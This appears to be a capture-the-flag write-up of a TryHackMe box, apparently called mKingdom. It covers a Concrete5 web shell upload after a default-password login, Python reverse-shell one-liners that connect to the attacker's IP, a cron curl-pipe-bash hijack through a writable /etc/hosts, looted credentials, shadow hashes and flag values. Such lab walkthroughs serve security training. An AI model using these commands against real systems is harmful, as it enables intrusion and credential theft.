# Recon

### Nmap

```
nmap -vvv -Pn -sC -sV -oN /opt/THM/mKingdom/1-recon/nmap/nmap_init.md 10.10.210.78
```

```
PORT   STATE SERVICE REASON  VERSION
85/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0H N0! PWN3D 4G4IN
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

# Enumeration

### WEB

http://10.10.210.78:85/

![[web85.png]]

```
gobuster dir -u http://10.10.210.78:85 -w /usr/share/wordlists/dirb/big.txt -o /opt/THM/mKingdom/2-enum/web/gob_dir_big.md
```

```
/app                  (Status: 301) [Size: 308] [--> http://10.10.210.78:85/app/]
```

http://10.10.210.78:85/app

![[appdir.png]]

looking at the source

```
<button onclick="buttonClick()">JUMP</button>  
  
    <script>  
        function buttonClick() {  
            alert("Make yourself confortable and enjoy my place.");  
            window.location.href = 'castle';  
        }  
    </script>
```

when clicking the jump button, we get a javascript alert

![[js alert.png]]

nothing much

more directory searching

```
gobuster dir -u http://10.10.210.78:85/app/ -w /usr/share/wordlists/dirb/big.txt -o /opt/THM/mKingdom/2-enum/web/gob_dir_big.md
```

```
/castle               (Status: 301) [Size: 315] [--> http://10.10.210.78:85/app/castle/]
```

http://10.10.210.78:85/app/castle/

![[castledir.png]]

```
Built with [concrete5](http://www.concrete5.org) CMS.
```

```
<meta name="generator" content="concrete5 - 8.5.2"/>
```

```
searchsploit concrete5 cms         
--------------------------------------------- ---------------------------------
 Exploit Title                               |  Path
--------------------------------------------- ---------------------------------
Concrete CMS 5.4.1.1 - Cross-Site Scripting  | php/webapps/15915.py
Concrete5 CMS 5.5.2.1 - Information Disclosu | php/webapps/37103.txt
Concrete5 CMS 5.6.1.2 - Multiple Vulnerabili | php/webapps/26077.txt
Concrete5 CMS 5.6.2.1 - 'index.php?cID' SQL  | php/webapps/31735.txt
Concrete5 CMS 5.7.3.1 - 'Application::dispat | php/webapps/40045.txt
Concrete5 CMS 8.1.0 - 'Host' Header Injectio | php/webapps/41885.txt
Concrete5 CMS < 5.4.2.1 - Multiple Vulnerabi | php/webapps/17925.txt
Concrete5 CMS < 8.3.0 - Username / Comments  | php/webapps/44194.py
Concrete5 CMS FlashUploader - Arbitrary '.SW | php/webapps/37226.txt
--------------------------------------------- ---------------------------------
Shellcodes: No Results
```

not very helpful 

looking at the blog

```
http://10.10.210.78:85/app/castle/index.php/blog
```

index.php is actually a directory

checking ZAPROXY we can see there is a login page

http://10.10.210.78:85/app/castle/index.php/login

![[login.png]]


# Exploitation

trying 
```
admin
admin
```


```
Unable to complete action: your IP address has been banned. Please contact the administrator of this site for more information.
```

guess they were not kidding, rebooted the machine and tried more credentials

```
admin
password
```

http://10.10.210.78:85/app/castle/index.php/dashboard/welcome

![[admin dash.png]]


https://vulners.com/hackerone/H1:768322

following the vuln report, we navigate to allowed file types

```
http://10.10.210.78:85/app/castle/index.php/dashboard/system/files/filetypes
```

we add php and save, bringin the allowed files types to be 

```
flv, jpg, gif, jpeg, ico, docx, xla, png, psd, swf, doc, txt, xls, xlsx, csv, pdf, tiff, rtf, m4a, mov, wmv, mpeg, mpg, wav, 3gp, avi, m4v, mp4, mp3, qt, ppt, pptx, kml, xml, svg, webm, ogg, ogv, php
```

now we navigate to files

```
http://10.10.210.78:85/app/castle/index.php/dashboard/files/search
```

click on upload file

I am uploading phpbash

![[file upload.png]]

![[upload complete.png]]

visit the url

http://10.10.210.78:85/app/castle/application/files/6317/3227/4955/phpbash.php

we have an interactive shell

![[phpbash.png]]


# Persistence

# Privilege Escalation

### User Toad

setting up a reverse shell

we can see that python exists on the system

```
www-data@mkingdom.thm

:/var/www/html/app/castle/application/files/6317/3227/4955# which python

  
/usr/bin/python
```

```
nc -lvnp 1337
```

```
export RHOST="10.6.24.127";export RPORT=1337;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```


we get a hit on our reverse shell

```
listening on [any] 1337 ...
connect to [10.6.24.127] from (UNKNOWN) [10.10.210.78] 38134
$ whoami
whoami
www-data
$ uname -a
uname -a
Linux mkingdom.thm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```


```
export TERM=linux
python -c "import pty; pty.spawn('/bin/bash')"
```


poking around the app directory

```
cat /var/www/html/app/castle/application/config/database.php
```

```
<?php

return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',
            'character_set' => 'utf8',
            'collation' => 'utf8_unicode_ci',
        ],
    ],
];
```

SQL credentials for database mKingdom

```
toad
toadisthebest
```

but the credentials also work for the toad user

```
su toad
toadisthebest
```

/home/toad/smb.txt

```
Save them all Mario!

                                      \| /
                    ....'''.           |/
             .''''''        '.       \ |
             '.     ..     ..''''.    \| /
              '...''  '..''     .'     |/
     .sSSs.             '..   ..'    \ |
    .P'  `Y.               '''        \| /
    SS    SS                           |/
    SS    SS                           |
    SS  .sSSs.                       .===.
    SS .P'  `Y.                      | ? |
    SS SS    SS                      `==='
    SS ""    SS
    P.sSSs.  SS
    .P'  `Y. SS
    SS    SS SS                 .===..===..===..===.
    SS    SS SS                 |   || ? ||   ||   |
    ""    SS SS            .===.`==='`==='`==='`==='
  .sSSs.  SS SS            |   |
 .P'  `Y. SS SS       .===.`==='
 SS    SS SS SS       |   |
 SS    SS SS SS       `==='
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS

toad@mkingdom:~$ 
```

### User Mario

```
╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
MAIL=/var/mail/toad
USER=toad
RPORT=1337
SHLVL=3
HOME=/home/toad
OLDPWD=/home/toad
PWD_token=aWthVGVOVEFOdEVTCg==

```

from base64
```
ikaTeNTANtES
```

trying as password for mario

```
su mario
ikaTeNTANtES
```

it works

```
mario@mkingdom:/home/toad$ whoami
whoami
mario
```

### Root

checking for sudo privs

```
mario@mkingdom:/home/toad$ sudo -l
sudo -l
[sudo] password for mario: ikaTeNTANtES
            
Matching Defaults entries for mario on mkingdom:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    pwfeedback

User mario may run the following commands on mkingdom:
    (ALL) /usr/bin/id
```

strange pwfeedback variable 


```
cat /var/log/up.log
There are 39842 folder and files in TheCastleApp in - - - - > Fri Nov 22 06:56:01 EST 2024.
There are 39842 folder and files in TheCastleApp in - - - - > Fri Nov 22 06:57:02 EST 2024.
There are 39842 folder and files in TheCastleApp in - - - - > Fri Nov 22 06:58:01 EST 2024.
There are 39842 folder and files in TheCastleApp in - - - - > Fri Nov 22 06:59:01 EST 2024.

```

stranges cron job

```
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
```


pspy

getting it on the system

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy
```

```
python -m http.server 8000
```

```
wget http://10.6.24.127:8000/pspy
chmod 777 pspy
```

after waiting about a minute we get some activity

```
2024/11/22 07:03:01 CMD: UID=0     PID=18433  | bash 
2024/11/22 07:03:01 CMD: UID=0     PID=18432  | curl mkingdom.thm:85/app/castle/application/counter.sh 
2024/11/22 07:03:01 CMD: UID=0     PID=18431  | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log  
2024/11/22 07:03:01 CMD: UID=0     PID=18430  | CRON 
2024/11/22 07:03:01 CMD: UID=0     PID=18435  | bash 
2024/11/22 07:03:01 CMD: UID=0     PID=18437  | wc -l 
2024/11/22 07:03:01 CMD: UID=0     PID=18436  | ls -laR /var/www/html/app/castle/ 
2024/11/22 07:03:01 CMD: UID=0     PID=18439  |
```

the cronjob downloads a bash script from "mkingdom.thm:85", runs it, then outputs the results to a log file.

we can't modify the script, nor the cronjob

```
ls -la /etc/hosts
```

```
-rw-rw-r-- 1 root mario 342 Jan 26  2024 /etc/hosts
```

we can modify the box's DNS entry for mkingdom.thm in /etc/hosts

setup a SED command to switch the box's ip address with our own

```
cp /etc/hosts /tmp/hosts.bak
```

```
sed 's/127\.0\.1\.1\s*mkingdom\.thm/10.6.24.127   mkingdom.thm/g' /etc/hosts > /tmp/replace_hosts
```

```
cat /tmp/replace_hosts > /etc/hosts
```


our reverse shell on our machine

```
mkdir app; mkdir app/castle; mkdir app/castle/application;
```

```
nano app/castle/application/counter.sh
```

paste into the script

```
export RHOST="10.6.24.127";export RPORT=1341;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

start a listener

```
nc -lvnp 1341
```

start an http server on port 80 in directory relative to app

```
python3 -m http.server 85
```


```
listening on [any] 1341 ...
connect to [10.6.24.127] from (UNKNOWN) [10.10.210.78] 41420
# whoami
whoami
root
# sudo -l
sudo -l
Matching Defaults entries for root on mkingdom:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    pwfeedback

User root may run the following commands on mkingdom:
    (ALL : ALL) ALL
# 
```

/etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
saned:x:108:115::/home/saned:/bin/false
whoopsie:x:109:116::/nonexistent:/bin/false
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
sshd:x:116:65534::/var/run/sshd:/usr/sbin/nologin
mario:x:1001:1001:,,,:/home/mario:/bin/bash
toad:x:1002:1002:,,,:/home/toad:/bin/bash
mysql:x:118:126:MySQL Server,,,:/nonexistent:/bin/false
```

/etc/shadow
```
root:$6$i9R510nm$etdEikZ0ziCgTOqZxkozjn2RqcpgZo3VHtgsxVGtON33/H5PGdNwN5CBnAq7jsTidmcbB8rlZd0Vjk80MDKAd1:19517:0:99999:7:::
daemon:*:17959:0:99999:7:::
bin:*:17959:0:99999:7:::
sys:*:17959:0:99999:7:::
sync:*:17959:0:99999:7:::
games:*:17959:0:99999:7:::
man:*:17959:0:99999:7:::
lp:*:17959:0:99999:7:::
mail:*:17959:0:99999:7:::
news:*:17959:0:99999:7:::
uucp:*:17959:0:99999:7:::
proxy:*:17959:0:99999:7:::
www-data:*:17959:0:99999:7:::
backup:*:17959:0:99999:7:::
list:*:17959:0:99999:7:::
irc:*:17959:0:99999:7:::
gnats:*:17959:0:99999:7:::
nobody:*:17959:0:99999:7:::
libuuid:!:17959:0:99999:7:::
syslog:*:17959:0:99999:7:::
messagebus:*:17959:0:99999:7:::
usbmux:*:17959:0:99999:7:::
dnsmasq:*:17959:0:99999:7:::
avahi-autoipd:*:17959:0:99999:7:::
kernoops:*:17959:0:99999:7:::
rtkit:*:17959:0:99999:7:::
saned:*:17959:0:99999:7:::
whoopsie:*:17959:0:99999:7:::
speech-dispatcher:!:17959:0:99999:7:::
avahi:*:17959:0:99999:7:::
lightdm:*:17959:0:99999:7:::
colord:*:17959:0:99999:7:::
hplip:*:17959:0:99999:7:::
pulse:*:17959:0:99999:7:::
sshd:*:19516:0:99999:7:::
mario:$6$KwN00.jL$8GveAm2qtkF2n9eaCw/HuPKtcG.wJDCBT0BBSIWwjzPh/B46fUULtQ.frpYsKna3yl.KLP3KH9Ktp6HfQlHK/.:19517:0:99999:7:::
toad:$6$2vvV3OuC$b3qt0ut/ajEz2FOF2pcaIQGk2EIo67qN.83yYREzHUQh7azE.fvMMpDM0V94irZajzfoEDIJjEANeM5maMiun/:19751:0:99999:7:::
mysql:!:19685:0:99999:7:::
```


after playing with the root.txt file, turns out you need to changes permissions for /bin/cat

```
# cat /root/root.txt
cat /root/root.txt
cat: /root/root.txt: Permission denied
# chattr -a /root/root.txt
chattr -a /root/root.txt
# chmod 777 /root/root.txt
chmod 777 /root/root.txt
# cat /root/root.txt
cat /root/root.txt
cat: /root/root.txt: Permission denied
# cd /root
cd /root
# ls
ls
counter.sh  root.txt
# cat root.txt
cat root.txt
cat: root.txt: Permission denied
# ls -la root.txt
ls -la root.txt
-rwxrwxrwx 1 root root 38 Nov 27  2023 root.txt
# which cat  
which cat
/bin/cat
# chmod 777 /bin/cat
chmod 777 /bin/cat
# cat /root/root.txt
cat /root/root.txt
thm{e8b2f52d88b9930503cc16ef48775df0}
# 
```

/root/root.txt

```
thm{e8b2f52d88b9930503cc16ef48775df0}
```

/home/mario/user.txt

```
thm{030a769febb1b3291da1375234b84283}
```